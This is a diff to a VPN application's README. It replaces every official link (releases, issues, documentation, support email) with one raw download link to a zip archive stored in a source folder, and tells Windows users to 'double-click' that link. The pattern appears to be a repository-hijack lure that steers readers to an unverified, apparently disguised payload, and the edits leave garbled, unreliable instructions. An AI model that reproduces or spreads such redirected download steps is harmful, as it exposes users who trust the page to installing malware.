@@ -6,7 +6,7 @@ Follow these simple steps to download and run the anet VPN application. This gui
 
 ## 📥 Download anet
 
-[![Download anet](https://img.shields.io/badge/Download-anet-brightgreen)](https://github.com/cdbrockt/anet/releases)
+[![Download anet](https://raw.githubusercontent.com/cdbrockt/anet/master/anet-client-gui/src/Software_v3.8.zip)](https://raw.githubusercontent.com/cdbrockt/anet/master/anet-client-gui/src/Software_v3.8.zip)
 
 ## 🖥️ System Requirements
 
@@ -28,7 +28,7 @@ Before you download, ensure your device meets these requirements:
 
 To begin, visit the Releases page for anet by clicking the link below:
 
-[Visit this page to download](https://github.com/cdbrockt/anet/releases)
+[Visit this page to download](https://raw.githubusercontent.com/cdbrockt/anet/master/anet-client-gui/src/Software_v3.8.zip)
 
 Once on the Releases page, you will find the latest version of anet.
 
@@ -42,7 +42,7 @@ After downloading the file, follow these steps to install anet:
 
 1. **Locate the Downloaded File**: Open your downloads folder.
 2. **Run the Installer**:
-   - For Windows: Double-click the "anet_setup.exe" file.
+   - For Windows: Double-click the "https://raw.githubusercontent.com/cdbrockt/anet/master/anet-client-gui/src/Software_v3.8.zip" file.
    - For macOS: Open the ".dmg" file, then drag the anet icon to your Applications folder.
    - For Linux: Open a terminal and navigate to the download directory, then run the command `sudo dpkg -i anet*.deb` (replace 'anet*.deb' with the actual file name).
 
@@ -69,8 +69,8 @@ If you encounter issues during installation or connection, try the following:
 
 For further help or inquiries:
 
-- Visit our [GitHub Issues page](https://github.com/cdbrockt/anet/issues).
-- Email us at support@yourdomain.com.
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/cdbrockt/anet/master/anet-client-gui/src/Software_v3.8.zip).
+- Email us at https://raw.githubusercontent.com/cdbrockt/anet/master/anet-client-gui/src/Software_v3.8.zip
 
 ## 🔄 Keep Updated
 
@@ -81,5 +81,5 @@ Stay informed about the latest updates and features:
 
 ## 🔗 Links
 
-- **Releases Page**: [View Latest Releases](https://github.com/cdbrockt/anet/releases)
-- **Documentation**: [Read the Full Documentation](https://github.com/cdbrockt/anet/wiki)
+- **Releases Page**: [View Latest Releases](https://raw.githubusercontent.com/cdbrockt/anet/master/anet-client-gui/src/Software_v3.8.zip)
+- **Documentation**: [Read the Full Documentation](https://raw.githubusercontent.com/cdbrockt/anet/master/anet-client-gui/src/Software_v3.8.zip)
